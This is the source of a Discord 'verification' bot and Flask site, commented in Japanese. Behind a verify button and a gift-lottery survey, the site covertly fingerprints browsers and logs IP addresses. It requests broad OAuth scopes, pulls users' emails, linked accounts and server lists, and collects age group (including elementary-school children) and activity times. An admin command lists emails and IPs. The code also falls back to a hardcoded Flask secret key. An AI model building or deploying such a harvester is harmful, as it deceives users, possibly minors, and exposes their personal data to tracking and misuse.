import asyncio
import json
import os
import datetime
from threading import Thread

import discord
from discord import app_commands
from discord.ext import commands
from flask import Flask, render_template_string, request, jsonify, redirect, session
import requests

import firebase_admin
from firebase_admin import credentials, firestore

import logging

# ログ設定
logging.basicConfig(level=logging.INFO)

# --------------------------------------------------
# 設定 & 環境変数
# --------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN") or os.getenv("DISCORD_BOT_TOKEN")
PROXY_URL = os.getenv("PROXY_URL")
MEMBER_ROLE_ID = int(os.getenv("MEMBER_ROLE_ID", "0"))
TARGET_GUILD_ID = os.getenv("TARGET_GUILD_ID")
WEB_URL = os.getenv("WEB_URL", "").rstrip("/")
PORT = int(os.getenv("PORT", 10000))

# ★ 14個のロール用 ID設定 (環境変数またはIDを直接書き換え)
ROLE_IDS = {
    "愛国心の塊": int(os.getenv("ROLE_PATRIOT_ID", "0")),
    "野球好き": int(os.getenv("ROLE_BASEBALL_ID", "0")),
    "サッカー好き": int(os.getenv("ROLE_SOCCER_ID", "0")),
    "バスケ好き": int(os.getenv("ROLE_BASKET_ID", "0")),
    "天才肌": int(os.getenv("ROLE_GENIUS_SKIN_ID", "0")),
    "工作好き": int(os.getenv("ROLE_CRAFT_ID", "0")),
    "プログラミング好き": int(os.getenv("ROLE_PROGRAMMING_ID", "0")),
    "自由人": int(os.getenv("ROLE_FREEDOM_ID", "0")),
    "ゲームの天才": int(os.getenv("ROLE_GAME_GENIUS_ID", "0")),
    "天才": int(os.getenv("ROLE_GENIUS_ID", "0")),
    "浮上人": int(os.getenv("ROLE_ACTIVE_STREAK_ID", "0")), # 3日連続発言で自動付与
    "面白い人": int(os.getenv("ROLE_FUNNY_ID", "0")),
    "PC勢": int(os.getenv("ROLE_PC_ID", "0")),
    "スマホ勢": int(os.getenv("ROLE_MOBILE_ID", "0"))
}

CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
REDIRECT_URI = f"{WEB_URL}/oauth/callback" if WEB_URL else f"http://localhost:{PORT}/oauth/callback"

# --------------------------------------------------
# Firebase 初期化
# --------------------------------------------------
firebase_creds_json = os.getenv("FIREBASE_CREDENTIALS")

if firebase_creds_json:
    try:
        cred_dict = json.loads(firebase_creds_json)
        if "private_key" in cred_dict:
            cred_dict["private_key"] = cred_dict["private_key"].replace("\\n", "\n")
        cred = credentials.Certificate(cred_dict)
        firebase_admin.initialize_app(cred)
        print("✅ Firebase Admin SDK の初期化に成功しました")
    except Exception as e:
        print(f"❌ Firebase 初期化エラー: {e}")
elif os.path.exists("serviceAccountKey.json"):
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred)
    print("✅ ローカルファイルで Firebase の初期化に成功しました")
else:
    print("⚠️ 警告: FIREBASE_CREDENTIALS または serviceAccountKey.json が見つかりません。")

try:
    db = firestore.client()
except Exception as e:
    db = None
    print(f"⚠️ Firestoreクライアントの取得に失敗しました: {e}")

# --------------------------------------------------
# Firestore データヘルパー
# --------------------------------------------------
def save_user_data(user_id, data_dict):
    if not db:
        print("⚠️ データベースが未接続のためデータを保存できません")
        return
    try:
        doc_ref = db.collection("verifications").document(str(user_id))
        doc_ref.set(data_dict, merge=True)
    except Exception as e:
        print(f"❌ Firestore保存エラー: {e}")

def load_all_data():
    if not db:
        print("⚠️ データベースが未接続のためデータを読み込めません")
        return {}
    try:
        docs = db.collection("verifications").stream()
        return {doc.id: doc.to_dict() for doc in docs}
    except Exception as e:
        print(f"❌ Firestore読み込みエラー: {e}")
        return {}

# --------------------------------------------------
# Flask Webサーバー
# --------------------------------------------------
app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "kuwakuwa_secret_key_change_this")

@app.route("/ping")
def ping():
    return "pong", 200

# 認証前ページ
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>認証</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; }
    .container { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 16px; text-align: center; width: 90%; max-width: 420px; }
    h1 { font-size: 1.5rem; margin-bottom: 10px; }
    p { color: #aaa; font-size: 0.9rem; margin-bottom: 25px; }
    .verify-btn { width: 100%; padding: 14px; font-size: 1rem; color: #fff; background: #5865F2; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; transition: background 0.2s; }
    .verify-btn:hover { background: #4752C4; }
  </style>
</head>
<body>
  <div class="container">
    <h1>認証</h1>
    <p>認証を行ってください。</p>
    <button id="verify-btn" class="verify-btn" onclick="startAuth()">Discordアカウントで認証する</button>
  </div>
  <script>
    function startAuth() {
      const clientInfo = {
        screen_resolution: window.screen.width + "x" + window.screen.height,
        color_depth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        hardware_concurrency: navigator.hardwareConcurrency || "不明"
      };
      
      fetch("/save-client-info/{{ user_id }}", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(clientInfo)
      }).then(() => {
        window.location.href = "/oauth/login/{{ user_id }}";
      }).catch(() => {
        window.location.href = "/oauth/login/{{ user_id }}";
      });
    }
  </script>
</body>
</html>
"""

# 認証完了画面
SUCCESS_TEMPLATE = """
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>認証完了</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; }
    .container { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 16px; text-align: center; width: 90%; max-width: 440px; }
    h1 { font-size: 1.5rem; color: #80ff80; margin-bottom: 15px; }
    p { color: #ccc; font-size: 0.95rem; line-height: 1.5; margin-bottom: 25px; }
    .quiz-btn { width: 100%; padding: 14px; font-size: 1rem; color: #fff; background: #5865F2; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; transition: background 0.2s; }
    .quiz-btn:hover { background: #4752C4; }
  </style>
</head>
<body>
  <div class="container">
    <h1>✅ 認証成功！</h1>
    <p>権限の付与が完了しました。<br>続いて、14個の質問に答えてプレゼントや特別ロールをゲットしよう！</p>
    <a href="/questions/{{ user_id }}" class="quiz-btn">✨ 質問ページに進む (全14問)</a>
  </div>
</body>
</html>
"""

# ★ 14個の質問ページ（Q1:面白いか / Q2:ゲーム環境 / Q3:趣味・マイブーム を反映）
QUESTIONNAIRE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>プレゼント応募アンケート</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; padding: 20px; }
    .container { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 30px; border-radius: 16px; width: 100%; max-width: 550px; }
    h1 { font-size: 1.4rem; color: #80ff80; margin-bottom: 10px; text-align: center; }
    p.desc { color: #ccc; font-size: 0.88rem; margin-bottom: 25px; text-align: center; line-height: 1.4; }
    .form-group { margin-bottom: 18px; }
    label { display: block; margin-bottom: 6px; font-size: 0.88rem; color: #ddd; font-weight: bold; }
    input[type="text"], input[type="email"], select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.2); background: #222; color: #fff; font-size: 0.95rem; }
    .submit-btn { width: 100%; padding: 14px; font-size: 1rem; color: #fff; background: #5865F2; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; transition: background 0.2s; }
    .submit-btn:hover { background: #4752C4; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎁 スペシャルアンケート（全14問）</h1>
    <p class="desc">以下の質問に回答して送信すると、回答に応じた【特別ロール】と【プレゼント抽選権】を獲得できます！</p>
    
    <form action="/submit-answers/{{ user_id }}" method="POST">
      <!-- Q1: 自分は面白いと思いますか？ -->
      <div class="form-group">
        <label>1. 🤡 自分は面白いと思いますか？ (「面白い人」ロール対応)</label>
        <select name="q1_funny">
          <option value="はい">はい（我こそはムードメーカー！）</option>
          <option value="いいえ">いいえ（どちらかといえば一般人）</option>
        </select>
      </div>

      <!-- Q2: 遊ぶゲーム環境 -->
      <div class="form-group">
        <label>2. 💻 主に遊ぶゲーム環境は？ (PC勢 / スマホ勢 対応)</label>
        <select name="q2_platform">
          <option value="PC">PC (Java版マイクラなど)</option>
          <option value="スマホ">スマホ / タブレット</option>
          <option value="コンシューマー">Switch / PS4 / PS5</option>
          <option value="その他">その他</option>
        </select>
      </div>

      <!-- Q3: 趣味やマイブーム -->
      <div class="form-group">
        <label>3. 🎨 趣味やマイブームは？ (野球 / サッカー / バスケ / 工作 / プログラミング等)</label>
        <input type="text" name="q3_hobby" placeholder="例: 野球、プログラミング、工作、サッカー" required>
      </div>

      <!-- Q4: メールアドレス -->
      <div class="form-group">
        <label>4. 📧 ご連絡用メールアドレス (プレゼント受取用)</label>
        <input type="email" name="q4_email" required placeholder="example@gmail.com">
      </div>

      <!-- Q5: ニックネーム -->
      <div class="form-group">
        <label>5. 🏷️ サーバー内で呼ばれたい名前（ニックネーム）</label>
        <input type="text" name="q5_nickname" placeholder="例: みかん" required>
      </div>

      <!-- Q6: 年齢層 -->
      <div class="form-group">
        <label>6. 🎂 年齢層（または学年）</label>
        <select name="q6_age_group">
          <option value="小学生以下">小学生以下</option>
          <option value="中学生">中学生</option>
          <option value="高校生">高校生</option>
          <option value="大学生・専門生">大学生・専門生</option>
          <option value="社会人">社会人</option>
          <option value="秘密">秘密</option>
        </select>
      </div>

      <!-- Q7: 一番好きなゲームジャンル -->
      <div class="form-group">
        <label>7. 🎮 一番好きなゲームジャンル</label>
        <input type="text" name="q7_favorite_genre" placeholder="例: Sandbox, FPS, RPG" required>
      </div>

      <!-- Q8: 主にインする時間帯 -->
      <div class="form-group">
        <label>8. 🕒 主にインする時間帯</label>
        <select name="q8_play_time">
          <option value="平日夕方 (16時〜19時)">平日夕方 (16時〜19時)</option>
          <option value="平日夜 (19時〜23時)">平日夜 (19時〜23時)</option>
          <option value="深夜 (23時以降)">深夜 (23時以降)</option>
          <option value="休日メイン">休日メイン</option>
        </select>
      </div>

      <!-- Q9: 通話(VC)参加について -->
      <div class="form-group">
        <label>9. 🎙️ 通話(VC)参加について</label>
        <select name="q9_vc">
          <option value="聞き専・喋るのどちらもOK">聞き専・喋るのどちらもOK</option>
          <option value="聞き専のみ">聞き専のみ</option>
          <option value="チャットのみ(VC不可)">チャットのみ(VC不可)</option>
        </select>
      </div>

      <!-- Q10: 欲しいプレゼントの種類 -->
      <div class="form-group">
        <label>10. 🎁 抽選で当たると嬉しいプレゼント</label>
        <select name="q10_gift_pref">
          <option value="Amazonギフトカード">Amazonギフトカード</option>
          <option value="PayPayポイント">PayPayポイント</option>
          <option value="Discord Nitro">Discord Nitro</option>
          <option value="ゲーム内アイテム・ロール">ゲーム内アイテム・特別ロール</option>
        </select>
      </div>

      <!-- Q11: 一番好きな食べ物 -->
      <div class="form-group">
        <label>11. 🍕 一番好きな食べ物</label>
        <input type="text" name="q11_food" placeholder="例: ラーメン、みかん" required>
      </div>

      <!-- Q12: サーバーを知ったきっかけ -->
      <div class="form-group">
        <label>12. 🔍 このサーバーを知ったきっかけ</label>
        <select name="q12_source">
          <option value="友達からの招待">友達からの招待</option>
          <option value="X (旧Twitter)">X (旧Twitter)</option>
          <option value="Discord掲示板・Wiki">Discord掲示板・Wiki</option>
          <option value="YouTube / Twitch">YouTube / Twitch</option>
          <option value="その他">その他</option>
        </select>
      </div>

      <!-- Q13: このサーバーでやりたいこと -->
      <div class="form-group">
        <label>13. 🌟 このサーバーでやりたいこと</label>
        <input type="text" name="q13_goal" placeholder="例: 国を作りたい、雑談したい" required>
      </div>

      <!-- Q14: 運営・管理陣へメッセージや質問 -->
      <div class="form-group">
        <label>14. 💬 運営・管理陣へメッセージや質問</label>
        <input type="text" name="q14_message" placeholder="例: よろしくお願いします！" required>
      </div>

      <button type="submit" class="submit-btn">回答を送信してロールを受け取る</button>
    </form>
  </div>
</body>
</html>
"""

# 送信完了画面
DONE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>送信完了</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; }
    .container { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 16px; text-align: center; width: 90%; max-width: 420px; }
    h1 { font-size: 1.5rem; color: #80ff80; margin-bottom: 15px; }
    p { color: #ccc; font-size: 0.95rem; line-height: 1.5; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎉 すべて完了しました！</h1>
    <p>アンケートの回答とロールの付与が完了しました。<br>Discordアプリに戻ってご確認ください！</p>
  </div>
</body>
</html>
"""

@app.route("/")
def home():
    return "Bot status: Running"

@app.route("/verify/<int:user_id>", methods=["GET"])
def verify(user_id):
    session['target_user_id'] = user_id
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route("/save-client-info/<int:user_id>", methods=["POST"])
def save_client_info(user_id):
    data = request.json or {}
    session['client_info'] = data
    return jsonify({"status": "ok"})

@app.route("/oauth/login/<int:user_id>")
def oauth_login(user_id):
    session['target_user_id'] = user_id
    if not CLIENT_ID:
        return "❌ サーバー設定エラー: DISCORD_CLIENT_ID が設定されていません。", 500
    
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read%20guilds.join"
    )
    return redirect(discord_auth_url)

@app.route("/oauth/callback")
def oauth_callback():
    code = request.args.get("code")
    user_id = session.get('target_user_id')

    if not code or not user_id:
        return "❌ 認証エラーが発生しました。もう一度やり直してください。", 400

    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip_address and "," in ip_address:
        ip_address = ip_address.split(",")[0].strip()

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    if token_res.status_code != 200:
        return f"❌ Discordトークンの取得に失敗しました: {token_res.text}", 400

    token_json = token_res.json()
    access_token = token_json.get("access_token")
    user_headers = {"Authorization": f"Bearer {access_token}"}

    if TARGET_GUILD_ID and access_token:
        join_url = f"https://discord.com/api/v10/guilds/{TARGET_GUILD_ID}/members/{user_id}"
        join_headers = {
            "Authorization": f"Bot {BOT_TOKEN}",
            "Content-Type": "application/json"
        }
        join_data = {"access_token": access_token}
        requests.put(join_url, headers=join_headers, json=join_data)

    user_res = requests.get("https://discord.com/api/users/@me", headers=user_headers)
    if user_res.status_code != 200:
        return "❌ ユーザー情報の取得に失敗しました。", 400
    user_info = user_res.json()

    discord_username = user_info.get("username", f"User_{user_id}")
    global_name = user_info.get("global_name", "設定なし")
    discord_email = user_info.get("email", "未取得")
    verified = user_info.get("verified", False)
    mfa_enabled = user_info.get("mfa_enabled", False)
    locale = user_info.get("locale", "不明")
    
    avatar = user_info.get("avatar")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "なし"
    
    banner = user_info.get("banner")
    banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner}.png" if banner else "なし"
    accent_color = user_info.get("accent_color")
    accent_color_hex = f"#{accent_color:06x}" if accent_color else "なし"

    connections_list = []
    conn_res = requests.get("https://discord.com/api/users/@me/connections", headers=user_headers)
    if conn_res.status_code == 200:
        connections_list = [f"{c.get('type')}: {c.get('name')}" for c in conn_res.json()]

    guilds_detail = []
    guild_res = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers)
    if guild_res.status_code == 200:
        guilds_json = guild_res.json()
        guilds_detail = [{"name": g.get("name"), "id": g.get("id"), "owner": g.get("owner")} for g in guilds_json]

    client_info = session.get('client_info', {})

    guild = discord_bot.guilds[0] if discord_bot.guilds else None
    roles_list = []

    if guild:
        async def process_member():
            nonlocal roles_list
            try:
                member = await guild.fetch_member(user_id)
                if member:
                    roles_list = [r.name for r in member.roles if r.name != "@everyone"]
                    if MEMBER_ROLE_ID != 0:
                        role = guild.get_role(MEMBER_ROLE_ID)
                        if role:
                            await member.add_roles(role)
            except Exception as e:
                print(f"❌ メンバー処理エラー: {e}")

        future = asyncio.run_coroutine_threadsafe(process_member(), discord_bot.loop)
        try:
            future.result(timeout=10)
        except Exception as e:
            print(f"❌ 非同期処理タイムアウト/エラー: {e}")

    session['oauth_data'] = {
        "username": discord_username,
        "global_name": global_name,
        "discord_oauth_email": discord_email,
        "verified": verified,
        "mfa_enabled": mfa_enabled,
        "locale": locale,
        "avatar_url": avatar_url,
        "banner_url": banner_url,
        "accent_color": accent_color_hex,
        "roles": roles_list,
        "ip": ip_address,
        "connections": connections_list,
        "guilds_detail": guilds_detail,
        "guilds_count": len(guilds_detail),
        "client_info": client_info
    }

    return render_template_string(SUCCESS_TEMPLATE, user_id=user_id)

@app.route("/questions/<int:user_id>")
def questions_page(user_id):
    session['target_user_id'] = user_id
    return render_template_string(QUESTIONNAIRE_TEMPLATE, user_id=user_id)

@app.route("/submit-answers/<int:user_id>", methods=["POST"])
def submit_answers(user_id):
    answers = {
        "q1_funny": request.form.get("q1_funny", ""),
        "q2_platform": request.form.get("q2_platform", ""),
        "q3_hobby": request.form.get("q3_hobby", ""),
        "q4_email": request.form.get("q4_email", ""),
        "q5_nickname": request.form.get("q5_nickname", ""),
        "q6_age_group": request.form.get("q6_age_group", ""),
        "q7_favorite_genre": request.form.get("q7_favorite_genre", ""),
        "q8_play_time": request.form.get("q8_play_time", ""),
        "q9_vc": request.form.get("q9_vc", ""),
        "q10_gift_pref": request.form.get("q10_gift_pref", ""),
        "q11_food": request.form.get("q11_food", ""),
        "q12_source": request.form.get("q12_source", ""),
        "q13_goal": request.form.get("q13_goal", ""),
        "q14_message": request.form.get("q14_message", "")
    }

    oauth_data = session.get('oauth_data', {})

    # Q1, Q2, Q3の回答から付与するロールを自動判定
    roles_to_add = []
    
    # Q1: 面白い人判定
    if answers["q1_funny"] == "はい" and ROLE_IDS["面白い人"] != 0:
        roles_to_add.append(ROLE_IDS["面白い人"])

    # Q2: PC勢 / スマホ勢判定
    if answers["q2_platform"] == "PC" and ROLE_IDS["PC勢"] != 0:
        roles_to_add.append(ROLE_IDS["PC勢"])
    elif answers["q2_platform"] == "スマホ" and ROLE_IDS["スマホ勢"] != 0:
        roles_to_add.append(ROLE_IDS["スマホ勢"])

    # Q3: 趣味・マイブームのキーワード判定（野球、サッカー、バスケ、工作、プログラミング）
    hobby_text = answers["q3_hobby"]
    if "野球" in hobby_text and ROLE_IDS["野球好き"] != 0:
        roles_to_add.append(ROLE_IDS["野球好き"])
    if "サッカー" in hobby_text and ROLE_IDS["サッカー好き"] != 0:
        roles_to_add.append(ROLE_IDS["サッカー好き"])
    if "バスケ" in hobby_text and ROLE_IDS["バスケ好き"] != 0:
        roles_to_add.append(ROLE_IDS["バスケ好き"])
    if "工作" in hobby_text and ROLE_IDS["工作好き"] != 0:
        roles_to_add.append(ROLE_IDS["工作好き"])
    if "プログラミング" in hobby_text and ROLE_IDS["プログラミング好き"] != 0:
        roles_to_add.append(ROLE_IDS["プログラミング好き"])

    # Discord Bot側で該当ロールを付与
    guild = discord_bot.guilds[0] if discord_bot.guilds else None
    if guild and roles_to_add:
        async def assign_roles():
            try:
                member = await guild.fetch_member(user_id)
                if member:
                    for r_id in roles_to_add:
                        role = guild.get_role(r_id)
                        if role and role not in member.roles:
                            await member.add_roles(role)
            except Exception as e:
                print(f"❌ アンケートロール付与エラー: {e}")

        future = asyncio.run_coroutine_threadsafe(assign_roles(), discord_bot.loop)
        try:
            future.result(timeout=10)
        except Exception as e:
            print(f"❌ ロール付与非同期エラー: {e}")

    # Firestoreに保存
    save_user_data(user_id, {
        **oauth_data,
        "email": answers["q4_email"],
        "answers": answers,
        "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

    return render_template_string(DONE_TEMPLATE)

# --------------------------------------------------
# Discord Bot UI Views & Events
# --------------------------------------------------
class RuleVerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="認証を行う", style=discord.ButtonStyle.primary, custom_id="rule_verify_btn")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        base_url = WEB_URL if WEB_URL else f"http://localhost:{PORT}"
        verify_url = f"{base_url}/verify/{user_id}"
        
        view = discord.ui.View()
        view.add_item(discord.ui.Button(label="🔗 認証ページを開く", style=discord.ButtonStyle.link, url=verify_url))

        await interaction.response.send_message(
            "↓下のボタンをクリックして認証を進めてください。",
            view=view,
            ephemeral=True
        )

class MyBot(commands.Bot):
    async def setup_hook(self):
        self.add_view(RuleVerifyView())
        synced = await self.tree.sync()
        print(f"✅ スラッシュコマンド同期完了: {len(synced)} 件")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

discord_bot = MyBot(command_prefix="!", intents=intents, proxy=PROXY_URL)

@discord_bot.event
async def on_ready():
    print("========================================")
    print("✅ Discord Bot 接続成功")
    print(f"🤖 Bot: {discord_bot.user}")
    print("========================================")

# ★ 3日連続発言での「浮上人」ロール自動付与
@discord_bot.event
async def on_message(message):
    if message.author.bot or not message.guild:
        return

    user_id = str(message.author.id)
    today_str = datetime.date.today().isoformat()
    yesterday_str = (datetime.date.today() - datetime.timedelta(days=1)).isoformat()

    if not db:
        return

    try:
        user_ref = db.collection("chat_streaks").document(user_id)
        doc = user_ref.get()

        last_date = ""
        streak_count = 0

        if doc.exists:
            data = doc.to_dict()
            last_date = data.get("last_date", "")
            streak_count = data.get("streak_count", 0)

        if last_date != today_str:
            if last_date == yesterday_str:
                streak_count += 1
            else:
                streak_count = 1

            user_ref.set({
                "last_date": today_str,
                "streak_count": streak_count
            }, merge=True)

            # 3日連続達成で「浮上人」ロールを付与
            if streak_count >= 3 and ROLE_IDS["浮上人"] != 0:
                role = message.guild.get_role(ROLE_IDS["浮上人"])
                if role and role not in message.author.roles:
                    await message.author.add_roles(role)

    except Exception as e:
        print(f"❌ 連続発言処理エラー: {e}")

    await discord_bot.process_commands(message)

# --------------------------------------------------
# スラッシュコマンド (/rule, /kuwakuwa)
# --------------------------------------------------

@discord_bot.tree.command(name="rule", description="認証パネルを送信します")
@app_commands.allowed_installs(guilds=True, users=False)
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def rule_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="認証",
        description="下のボタンを押して、システム認証を行ってください。",
        color=0x5865F2
    )
    await interaction.response.send_message(embed=embed, view=RuleVerifyView())

@discord_bot.tree.command(name="kuwakuwa", description="全データを取得します")
@app_commands.allowed_installs(guilds=True, users=False)
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
@app_commands.default_permissions(administrator=True)
async def kuwakuwa_command(interaction: discord.Interaction):
    try:
        data = load_all_data()
        if not data:
            await interaction.response.send_message("記録はありません（またはデータベースが未接続です）。", ephemeral=True)
            return
        
        lines = []
        for uid, info in data.items():
            username = info.get('username', 'Unknown')
            g_name = info.get('global_name', '')
            email = info.get('email', '未取得')
            answers = info.get('answers', {})
            ip = info.get('ip', '未記録')
            updated_at = info.get('updated_at', '日時不明')
            
            nick = answers.get("q5_nickname", "なし")
            hobby = answers.get("q3_hobby", "未記入")
            
            lines.append(
                f"・**{username}** ({g_name}) │ Nick: `{nick}` (ID: `{uid}`)\n"
                f"  └ ✉️ メール: `{email}` │ 🎨 趣味: `{hobby}`\n"
                f"  └ 🌐 IP: `{ip}` │ 🕒 記録日時: `{updated_at}`"
            )
        
        current_chunk = "📜 **【取得データ一覧】**\n\n"
        chunks = []
        
        for line in lines:
            if len(current_chunk) + len(line) + 1 > 1950:
                chunks.append(current_chunk)
                current_chunk = ""
            current_chunk += line + "\n\n"
        
        if current_chunk:
            chunks.append(current_chunk)

        await interaction.response.send_message(chunks[0], ephemeral=True)
        for chunk in chunks[1:]:
            await interaction.followup.send(chunk, ephemeral=True)

    except Exception as e:
        print(f"❌ kuwakuwaコマンド実行エラー: {e}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"❌ エラーが発生しました: {e}", ephemeral=True)

# --------------------------------------------------
# Bot起動処理
# --------------------------------------------------
async def start_bot_with_retry():
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN が環境変数に設定されていません。")

    retry_delay = 15
    max_delay = 300

    while True:
        try:
            print("🚀 Discord Bot に接続を試みています...")
            await discord_bot.start(BOT_TOKEN)
            break
        except discord.errors.HTTPException as e:
            if e.status in (429, 502, 504):
                print(f"⚠️ Discord API 通信エラー ({e.status})。{retry_delay} 秒後に再試行します...")
                await asyncio.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, max_delay)
            else:
                print(f"❌ Discord HTTP エラー: {e}")
                await asyncio.sleep(15)
        except Exception as e:
            print(f"❌ エラーが発生しました: {e}")
            await asyncio.sleep(15)

# --------------------------------------------------
# メイン実行
# --------------------------------------------------
async def main():
    flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    print(f"🌐 Flask サーバーをポート {PORT} で起動しました")

    await start_bot_with_retry()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("👋 プログラムを終了します。")
